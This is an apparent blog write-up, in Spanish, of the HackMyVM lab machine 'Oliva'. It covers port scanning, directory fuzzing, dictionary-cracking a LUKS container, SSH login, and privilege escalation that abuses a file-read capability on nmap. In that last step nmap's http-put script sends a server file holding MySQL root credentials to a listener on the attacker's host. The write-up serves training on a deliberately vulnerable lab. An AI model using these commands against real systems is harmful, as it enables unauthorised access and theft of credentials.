---
title: "Oliva Write-Up - HackMyVM"
description: "Oliva Write-Up - HackMyVM"
pubDatetime: 2023-08-30
tags: ["fácil", "hackmyvm", "LUKS", "cracking"]
---

# Reconocimiento

Primeramente como siempre realizamos un escaneo de puertos abiertos por TCP

```bash
❯ nmap -p- --open -A 192.168.18.141
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 20:32 CEST
Nmap scan report for 192.168.18.141
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Por el puerto 22 corre SSH y por el 80 un servicio web en el que hay una página de nginx por defecto versión 1.22.1.

![](@assets/HackMyVM/oliva/nginx.png)

Realizamos un fuzzing con gobuster.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.18.141/ -x html,txt,php -t 200 -o webScan
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.18.141/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 615]
/index.php            (Status: 200) [Size: 69]
Progress: 830516 / 830520 (100.00%)
===============================================================
Finished
===============================================================
```

Hay una ruta `index.php` con un link para descargar un encriptado "oliva".

![](@assets/HackMyVM/oliva/oliva.png)

```bash
❯ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

Se trata de un archivo encriptado con LUKS.

> LUKS es un programa para GNU/Linux de código abierto cuyas siglas significan Linux Unified Key Setup. LUKS sirve para especificar métodos de cifrado, que sirven para encriptar el disco duro de una máquina con dicho sistema operativo. LUKS utiliza algoritmos criptográficos seguros, que a la vez cuentan con un alto nivel de compatibilidad. Es decir, LUKS permite cifrar las diferentes particiones del disco duro de un sistema, de manera versátil, compatible y segura.

# Crackeando LUKS e intrusión

Buscando para crackearlo encuentro el siguiente repositorio [Brute-Force LUKS](https://github.com/glv2/bruteforce-luks). Me lo clono y sigo los pasos de instalación.

Corremos el programa sobre el archivo **oliva** y obtenemos una contraseña.

```bash
❯ ./bruteforce-luks -t 6 -f /usr/share/seclists/rockyou.txt -v 30 ../../content/oliva # -t: hilos, -f: worlist, -v: verbose cada 30s
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 971
Tried passwords per second: 0.916903
Last tried password: tucker

Password found: bebita
```

Desciframos el archivo:

```bash
❯ cryptsetup luksOpen oliva oliva
```

Ahora el archivo se encuentra seguramente en la siguiente ruta:

```bash
❯ ls /dev/mapper

oliva
```

Para acceder a los contenidos tenemos que montarlo a una ruta del sistema

```bash
❯ mkdir tmp

❯ sudo mount /dev/mapper/oliva tmp

❯ ls tmp
lost+found mypass.txt

❯ cat tmp/mypass.txt
Yesthatsmypass!
```

## SSH

Nos conectamos con SSH con la contraseña de antes y el usuario **oliva**.

```bash
❯ sshpass -p 'Yesthatsmypass!' ssh oliva@192.168.18.141
```

![/assets/HackMyVM/oliva/user.png]

# Escalada

Listando las capabilities encuentro que nmap tiene seteado la siguiente.

```bash
oliva@oliva:/dev/shm$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
```

Lo que significa que puede leer cualquier archivo del sistema.

Para explotar esto voy a intentar leer la clave privada SSH de root usando el siguiente payload de [gtfobins](https://gtfobins.github.io/).

![](@assets/HackMyVM/oliva/gtfobins.png)

Tras probar varios archivos encuentro que en el `index.php` del principio hay credenciales para mysql.

Nos ponemos en escucha y mandamos el archivo.

```bash
oliva@oliva:/dev/shm$ nmap -p 8080 192.168.134.1 --script http-put --script-args http-put.url=/,http-put.file=/var/www/html/index.php
```

```bash
❯ socat -v tcp-listen:8080,reuseaddr,fork -
> 2023/08/31 19:39:35.000011432  length=340 from=0 to=339
PUT / HTTP/1.1\r
Content-Length: 163\r
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r
Connection: close\r
Host: 192.168.134.1:8080\r
\r
Hi oliva,
Here the pass to obtain root:

<?php
$dbname = 'easy';
$dbuser = 'root';
$dbpass = 'Savingmypass';
$dbhost = 'localhost';
?>
...
```

Nos conectamos a mysql

```bash
oliva@oliva:~$ mysql -u root -p
Enter password: Savingmypass
```

![](@assets/HackMyVM/oliva/mysql.png)

Credenciales en texto claro...

Nos logeamos como root con la contraseña que nos dan y tenemos shell como root.

![](@assets/HackMyVM/oliva/root.png)

# Referencias

- [https://keepcoding.io/blog/que-es-luks/](https://keepcoding.io/blog/que-es-luks/)
- [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
